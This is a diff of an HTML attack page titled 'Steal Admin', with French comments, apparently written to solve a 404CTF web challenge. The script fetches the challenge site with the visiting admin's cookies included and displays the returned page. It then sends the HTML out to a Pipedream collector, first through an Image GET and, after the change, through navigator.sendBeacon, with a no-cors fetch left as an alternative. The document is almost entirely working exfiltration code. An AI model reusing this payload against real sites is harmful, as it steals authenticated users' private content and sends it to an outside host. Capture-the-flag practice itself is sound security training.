@@ -5,36 +5,39 @@
     <title>Steal Admin</title>
   </head>
   <body>
-    <!-- 1️⃣ Zone d’affichage locale pour debug -->
     <h1>Contenu volé :</h1>
     <pre id="out">en attente…</pre>
 
-    <!-- 2️⃣ Balise IMG de test pour confirmer que la page a bien été chargée -->
+    <!-- confirmation de rendu -->
     <img src="https://eoyi24wnc60zgb.m.pipedream.net?test=1" alt="" />
 
     <script>
       (async () => {
-        /* 3️⃣ On fait un fetch first-party vers la home du challenge.
-         — Le host “spacefleetcommand.404ctf.fr” précède toujours le @,
-           donc le cookie admin est inclus.
-         — C’est traité comme “same-origin”, pas de CORS, pas de problème. */
+        // 1) Récupère la home du challenge AVEC le cookie admin
         const resp = await fetch("https://spacefleetcommand.404ctf.fr/", {
           credentials: "include",
         });
-
-        /* 4️⃣ On lit le HTML complet renvoyé (y compris les sections réservées à l’admin). */
         const html = await resp.text();
 
-        /* 5️⃣ On l’affiche dans le <pre> pour que tu voies directement le résultat. */
+        // 2) Affiche local pour vérif
         document.getElementById("out").textContent = html;
 
-        /* 6️⃣ Exfiltration vers Pipedream avec une requête GET via Image.
-         — On encode l’HTML et on le passe en paramètre “data”.
-         — Tu peux aussi utiliser navigator.sendBeacon si tu préfères. */
-        const img = new Image();
-        img.src =
-          "https://eoyi24wnc60zgb.m.pipedream.net/?data=" +
-          encodeURIComponent(html);
+        // 3) Exfiltration fiable en POST :
+        //    sendBeacon autorise les gros payloads même en mode no-cors
+        const blob = new Blob([html], { type: "text/plain" });
+        navigator.sendBeacon(
+          "https://eoyi24wnc60zgb.m.pipedream.net/collect",
+          blob
+        );
+
+        // — ou, si tu préfères fetch :
+        /*
+    fetch("https://eoyi24wnc60zgb.m.pipedream.net/collect", {
+      method: "POST",
+      mode:   "no-cors",
+      body:   html
+    });
+    */
       })();
     </script>
   </body>
